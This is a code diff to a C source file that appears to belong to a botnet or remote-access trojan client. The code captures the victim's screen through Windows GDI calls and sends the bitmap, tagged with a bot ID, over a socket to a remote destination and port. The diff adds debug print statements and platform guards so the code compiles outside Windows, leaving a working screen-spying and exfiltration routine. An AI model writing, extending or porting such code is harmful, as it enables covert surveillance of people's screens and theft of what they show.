@@ -2,9 +2,13 @@
 #include "Sockets.h"
 #include "GateHelper.h"
 
-#include <Windows.h>
+#include "WindowsCompat.h"
 
 char* CaptureScreenshot(int* length) {
+#ifdef _DEBUG_
+	printf("[+] CaptureScreenshot().\n");
+#endif
+#if defined (__WIN32)
 	HDC hdcScr, hdcMem;
 
 	HBITMAP hBitmap;
@@ -100,7 +104,7 @@ char* CaptureScreenshot(int* length) {
 
 	DWORD dwSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + pbih->biClrUsed * sizeof(RGBQUAD);
 	dwSize += cb;
-	
+
 	char* image = (char*)GlobalAlloc(GMEM_FIXED, dwSize);
 	memcpy_s(image, dwSize, &hdr, sizeof(BITMAPFILEHEADER));
 	memcpy_s(image + sizeof(BITMAPFILEHEADER), dwSize - sizeof(BITMAPFILEHEADER), pbih, sizeof(BITMAPINFOHEADER));
@@ -113,13 +117,24 @@ char* CaptureScreenshot(int* length) {
 
 	*length = dwSize;
 	return image;
+#else
+	return NULL;
+#endif
 }
 
 void FreeScreenshot(char* data) {
+#if defined(__WIN32)
 	GlobalFree((HGLOBAL)data);
+#else
+	if (data) free(data);
+#endif
 }
 
 bool SendScreenshot(char* destination, unsigned short port, char* data, int dataLength, char* botId) {
+#ifdef _DEBUG_
+	printf("[+] SendScreenshot(%s, %hu, %s, %d, %s)", destination, port, data, dataLength, botId);
+#endif
+#if defined(__WIN32)
 	sockaddr_in input;
 	if (!GetSocketAddress(destination, &input)) return false;
 	input.sin_port = htons(port);
@@ -150,6 +165,6 @@ bool SendScreenshot(char* destination, unsigned short port, char* data, int data
 
 	free(buffer);
 	closesocket(s);
-
+#endif
 	return true;
 }
